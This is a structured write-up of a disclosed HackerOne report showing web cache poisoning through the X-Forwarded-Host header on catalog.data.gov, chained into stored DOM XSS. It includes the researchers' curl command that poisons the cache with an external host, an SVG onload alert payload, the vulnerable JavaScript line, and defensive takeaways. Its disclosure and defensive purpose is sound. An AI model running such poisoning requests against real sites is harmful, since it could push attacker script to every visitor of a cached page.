# Web Cache Poisoning to Stored DOM XSS via X-Forwarded-Host Header Injection

## Metadata
- **Source:** HackerOne
- **Report:** 303730 | https://hackerone.com/reports/303730
- **Submitted:** 2018-01-10
- **Reporter:** albinowax
- **Program:** catalog.data.gov
- **Bounty:** not specified
- **Severity:** high
- **Vuln:** Web Cache Poisoning, DOM-based XSS, HTTP Header Injection, Stored XSS
- **CVEs:** None
- **Category:** web-api

## Summary
An attacker can poison CloudFront's cache by manipulating the X-Forwarded-Host header, causing the server to fetch malicious JSON from an attacker-controlled domain and inject it into the DOM without escaping. This results in stored DOM XSS that executes arbitrary JavaScript for all subsequent visitors to the poisoned URL.

## Attack scenario
1. Attacker crafts a GET request with malicious X-Forwarded-Host header pointing to attacker-controlled domain (portswigger-labs.net/catalog.data.gov_json_xss/json.php?)
2. Request is sent to catalog.data.gov, server trusts the header and sets data-site-root attribute on body tag to attacker's domain
3. Response is cached by CloudFront CDN with the poisoned data-site-root value
4. Legitimate users visit the poisoned URL and receive the cached response with malicious data-site-root
5. Client-side JavaScript fetches JSON from attacker's domain using the data-site-root attribute
6. Malicious JSON payload (containing SVG with onload handler) is inserted into DOM without sanitization, executing attacker's JavaScript in victim's browser

## Root cause
Server trusts untrusted X-Forwarded-Host header and uses it to populate HTML attributes without validation. Client-side JavaScript then fetches external resources based on these attributes and inserts the response into the DOM without proper HTML escaping or sanitization.

## Attacker mindset
Sophisticated attack combining multiple vulnerability classes: an attacker recognizes that while header injection alone is harmless, combining it with CDN caching creates a force-multiplier effect. By poisoning the cache once, the payload reaches thousands of victims without requiring each to send malicious headers. The attacker identified the specific JavaScript code path that uses unsanitized i18n() output in template concatenation.

## Defensive takeaways
- Never trust X-Forwarded-Host or similar proxy headers for security decisions; validate against a whitelist of known hosts
- Implement strict Content Security Policy (CSP) to prevent inline script execution and control external resource loading
- Always HTML-escape user-controlled data and external API responses before inserting into DOM; use textContent instead of innerHTML where possible
- Sanitize JSON responses before use in template injection contexts
- Implement cache key normalization to ignore potentially malicious headers in cache decisions
- Use SameSite cookie attributes and X-Content-Type-Options headers
- Audit all client-side JavaScript that loads and renders external data sources

## Variant hunting
Search for other proxy headers being trusted (X-Forwarded-Proto, X-Forwarded-Port, X-Original-Host, CF-Connecting-IP)
Hunt for innerHTML, document.write(), or eval() calls that process external API responses
Identify other data attributes on body/html tags populated from headers
Look for i18n/translation systems that fetch external JSON without sanitization
Search for CDN-cacheable endpoints that reflect untrusted headers
Test for template injection in JavaScript that concatenates unsanitized values into HTML

## MITRE ATT&CK
- T1190
- T1059
- T1203
- T1499

## Notes
This is a sophisticated chained vulnerability (CWE-444 + CWE-79 + CWE-444). The writeup demonstrates responsible disclosure by providing safe reproduction steps with query parameters to avoid unintended cache poisoning. CloudFront's cache behavior is critical to impact; without it, this would be a simple header injection with no practical exploitation path. The researchers show excellent security hygiene by warning others about cache poisoning risks.

## Full report
<details><summary>Expand</summary>

An attacker can deface various pages on catalog.data.gov, leading to them executing malicious JavaScript when visited by a normal user.

The root problem is that the server trusts the X-Forwarded-Host HTTP header, and uses this to populate the 'data-site-root' and 'data-locale-root' attributes on the <body tag. Some JavaScript then fetches a JSON file from the URL specified in these attributes, and writes the response to the page without escaping it, leading to a DOMXSS vulnerability.

This behaviour is harmless by itself, since I can't make a victim send a malicious HTTP header. Fortunately for me, I can ensure that the poisoned response sent to me is cached by CloudFront, meaning my payload will be served to loads of other users. 

Please be careful when exploring this issue, as it's potentially quite easy to accidentally poison CloudFront's cache and antagonise your visitors. To safely replicate this issue, you can use the following steps:

1. Run curl command to poison cache:
curl -i -s -k  -X $'GET' \
    -H $'Host: catalog.data.gov' -H $'Accept-Encoding: gzip, deflate' -H $'Accept: */*' -H $'Accept-Language: en' -H $'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H $'x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php?' -H $'Connection: close' \
    $'https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6' > /dev/null

2. Visit the poisoned page:
https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6

3. Wait for a few seconds, and observe the popup caused by our injected alert(document.domain)

Behind the scenes, step 1 poisons the cache with a data-site-root value of 'portswigger-labs.net/catalog.data.gov_json_xss/json.php'. In step 2, some JavaScript fetches our json.php file from portswigger-labs.net, and uses our 'show more' JSON attribute to translate the 'show more' text on https://catalog.data.gov/dataset/consumer-complaint-database into "Mostrar más <svg onload=alert(document.domain)>"

This is the offending line of JavaScript:
var template_more = ['<tr class="toggle-show toggle-show-more">', '<td colspan="' + cols + '">', '<small>', '<a href="#" class="show-more">' + this.i18n('show_more') + '</a>', '<a href="#" class="show-less">' + this.i18n('show_less') + '</a>', '</small>', '</td>', '</tr>'].join('\n');

To mitigate this issue, I recommend addressing the X-Forwarded-Host reflection. 

Please let me know if you have any questions.

Cheers,

James & Gareth

## Impact

An attacker can deface most pages on catalog.data.gov.

</details>

---
*Analysed by Claude on 2026-05-24*
